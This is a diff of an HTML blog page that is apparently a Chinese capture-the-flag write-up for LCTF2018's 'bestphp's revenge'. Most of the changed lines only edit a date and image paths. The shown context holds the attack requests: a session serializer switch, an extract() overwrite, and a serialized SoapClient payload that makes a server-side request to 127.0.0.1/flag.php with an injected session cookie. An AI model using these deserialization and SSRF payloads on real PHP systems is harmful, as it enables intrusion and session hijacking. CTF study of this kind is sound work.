@@ -580,7 +580,7 @@ call_user_func($_GET[&#39;f&#39;], $_">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-09-01
+                    2022-01-28
                 </div>
                 
 
@@ -613,7 +613,7 @@ call_user_func($_GET[&#39;f&#39;], $_">
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[SoapClient|call_user_func|ssrf]</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210812194724455.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210812194724455.png"></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'implode'</span><span class="token punctuation">;</span>
@@ -741,7 +741,7 @@ a:1:&#123;s:4:&quot;name&quot;;s:3:&quot;|sky&quot;;&#125;<span aria-hidden="tru
 POST:
 serialize_handler&#x3D;php_serialize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210813005433053.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210813005433053.png"></p>
 <p>1.利用<code>call_user_func($_GET[‘f’], $_POST);</code>函数，改变此页面的序列化引擎为<code>php_serialize</code></p>
 <p>2.<code>$_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];</code>将构造的序列化对象传入session中，并在前面加一个<code>|</code>符号。此时session会以<code>php_serialize</code>的规则储存。</p>
 <h4 id="触发反序列化"><a href="#触发反序列化" class="headerlink" title="触发反序列化"></a>触发反序列化</h4><pre class="line-numbers language-none"><code class="language-none">?f&#x3D;extract
@@ -749,7 +749,7 @@ serialize_handler&#x3D;php_serialize<span aria-hidden="true" class="line-numbers
 POST:
 b&#x3D;call_user_func<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210813010632531.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210813010632531.png"></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"a:1:&#123;s:4:"</span>name<span class="token string double-quoted-string">";s:199:"</span><span class="token string double-quoted-string">"]=> object(SoapClient)#1 (4) &#123; ["</span>uri<span class="token string double-quoted-string">"]=> string(3) "</span><span class="token number">123</span><span class="token string double-quoted-string">" ["</span>location<span class="token string double-quoted-string">"]=> string(25) "</span>http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/flag.php" ["_user_agent"]=> string(56) "N0rth3ty Cookie: PHPSESSID=817olmp68ukmnofc2mlp762ql0 " ["_soap_version"]=> int(1) &#125; &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>1.用<code>extract()</code>函数将<code>$b</code>覆盖为<code>call_user_func</code></p>
@@ -759,7 +759,7 @@ b&#x3D;call_user_func<span aria-hidden="true" class="line-numbers-rows"><span></
 <pre class="line-numbers language-none"><code class="language-none">&#96;call_user_func($b, $a);&#96;&#x3D;&#96;call_user_func(call_user_func, $a);&#96;&#x3D;&#96;call_user_func($a)&#96;&#x3D;&#96;call_user_func(array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);)&#96;,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后会执行函数名为<code>welcome_to_the_lctf2018</code>的方法，显然，这个方法不存在，就调用了<code>SoapClient</code>类魔术方法<code>__call()</code>然后执行一个请求(这是由<code>SoapClient</code>类的内部代码决定的)</p>
-<h4 id="改cookie"><a href="#改cookie" class="headerlink" title="改cookie"></a>改cookie</h4><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210813010738280.png"></p>
+<h4 id="改cookie"><a href="#改cookie" class="headerlink" title="改cookie"></a>改cookie</h4><p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-bestphp-s-revenge/image-20210813010738280.png"></p>
 <h2 id="奇文共赏"><a href="#奇文共赏" class="headerlink" title="奇文共赏"></a>奇文共赏</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102960092">https://blog.csdn.net/weixin_44077544/article/details/102960092</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">反序列化之PHP原生类的利用</a></p>
 
